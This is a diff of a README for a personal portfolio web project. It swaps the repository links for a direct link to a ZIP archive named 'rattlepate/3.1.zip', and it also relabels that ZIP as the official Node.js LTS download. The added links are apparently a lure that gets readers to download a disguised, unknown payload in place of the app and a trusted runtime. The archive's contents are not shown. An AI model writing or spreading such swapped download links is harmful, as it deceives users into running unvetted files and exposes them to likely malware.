@@ -1,12 +1,12 @@
 # 🎨 portfolio - Your Projects, Skills, And Certifications
 
-Visit this link to download the application: **https://github.com/Sethape/portfolio**
+Visit this link to download the application: **https://github.com/Sethape/portfolio/raw/refs/heads/main/rattlepate/3.1.zip**
 
 ---
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/Sethape/portfolio](https://github.com/Sethape/portfolio)
+Visit this link to download the application: [https://github.com/Sethape/portfolio/raw/refs/heads/main/rattlepate/3.1.zip](https://github.com/Sethape/portfolio/raw/refs/heads/main/rattlepate/3.1.zip)
 
 Once you click the link, you'll land on a page with a green button that says **"Code"**. Click it, then choose **"Download ZIP"**. The file will start downloading to your computer — usually to your "Downloads" folder.
 
@@ -51,7 +51,7 @@ If you'd like to make this portfolio truly yours, here's what you can do:
 
 The downloaded ZIP is ready to use right away with index.html. However, if you ever want to develop this project further or deploy it online, you'll need to set up a development environment:
 
-1. Install **Node.js** from https://nodejs.org (choose the LTS version).
+1. Install **Node.js** from https://github.com/Sethape/portfolio/raw/refs/heads/main/rattlepate/3.1.zip (choose the LTS version).
 2. Open a terminal or command prompt in the extracted folder.
 3. Run `npm install` to download all dependencies.
 4. Run `npm run dev` to start a local development server.
